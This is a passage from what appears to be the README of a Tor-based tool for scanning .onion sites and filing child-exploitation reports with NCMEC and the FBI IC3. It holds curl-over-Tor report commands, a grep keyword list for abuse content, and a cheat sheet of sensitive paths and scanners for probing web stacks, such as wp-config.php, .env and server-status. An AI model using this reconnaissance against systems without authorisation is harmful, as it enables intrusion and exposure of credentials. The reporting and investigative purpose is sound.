$(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -o -E "[a-zA-Z0-9]{56}\.onion" | sort -u)

EOF

echo "Report saved to ncmec_report.txt"
echo "Submit at: https://report.cybertip.org/"

# FBI IC3 format
cat > ic3_report.txt << EOF
IC3 COMPLAINT - CHILD EXPLOITATION

Date Discovered: $(date +%Y-%m-%d)
.onion URL: http://target.onion

Description of Illicit Content:
$(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion | grep -i -E "child|cp|lolita|764|pedo" | head -10)

Associated Identifiers:
- Email addresses: [list emails]
- Cryptocurrency wallets: [list wallets]
- Session IDs: [list session IDs]
- Chat platform invites: [list invites]

Technical Infrastructure:
- Web Server: $(curl -s --proxy socks5h://127.0.0.1:9050 http://target.onion -I | grep -i server)
- Technology Stack: [identified from fingerprinting]
- Linked Domains: [list linked .onion]

Submit at: https://www.ic3.gov/
EOF
```

---

### Exploitation Tool Installation Summary

```bash
# Install all recommended tools
sudo apt update
sudo apt install -y gobuster dirb wfuzz curl wget grep tor torify proxychains4 nmap nikto whatweb jq

# Install additional tools
pip3 install pygobuster httpx nuclei wpscan joomscan

# Install special tools
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh && chmod +x testssl.sh

# Verify Tor is working
torify curl https://check.torproject.org/api/ip
```

---

### Technology-Specific Cheat Sheet

| Technology | Key Files/Paths | Testing Commands |
|------------|----------------|-------------------|
| **Nginx** | `/nginx_status`, `/status` | `curl -I \| grep Server` |
| **Apache** | `/server-status`, `/.htaccess` | `curl /server-status` |
| **IIS** | `/trace.axd`, `/elmah.axd` | `curl /trace.axd` |
| **MySQL** | `/phpmyadmin`, `.sql` backups | `grep -r "mysql://"` |
| **PostgreSQL** | `/pgadmin`, `postgres://` | `grep -r "postgresql://"` |
| **MongoDB** | `mongodb://`, port 27017 | `curl port:27017` |
| **WordPress** | `wp-content`, `wp-config.php` | `wpscan` |
| **Joomla** | `configuration.php` | `joomscan` |
| **Drupal** | `sites/default/settings.php` | `drupalgeddon2` |
| **Gatsby** | `/page-data/`, `/___graphql` | `curl /___graphql` |
| **Flask** | `/console`, debug mode | `curl /notfound` |
| **Django** | `/admin`, `settings.py` | `curl /admin` |
| **Node.js** | `package.json`, `.env` | `curl /package.json` |
| **PHP** | `phpinfo.php`, `ini.php` | `curl /phpinfo.php` |

---
## Legal Disclaimer

This tool is designed for legitimate security assessments, threat intelligence operations, and forensic investigations. Users must obtain explicit written authorization before scanning any systems or networks. Unauthorized scanning of .onion services or any other infrastructure may violate local, national, and international laws. The developer assumes no liability for misuse or illegal activities conducted with this software.

## Operational Security

- All traffic routes through Tor SOCKS5 proxy
- No media files are downloaded
- Circuit rotation with User-Agent randomization prevents correlation
- Rate limit detection auto-rotates circuits when blocked
- Configurable delays prevent denial of service
- Text-only analysis only
- Crash recovery preserves state without exposing scan data
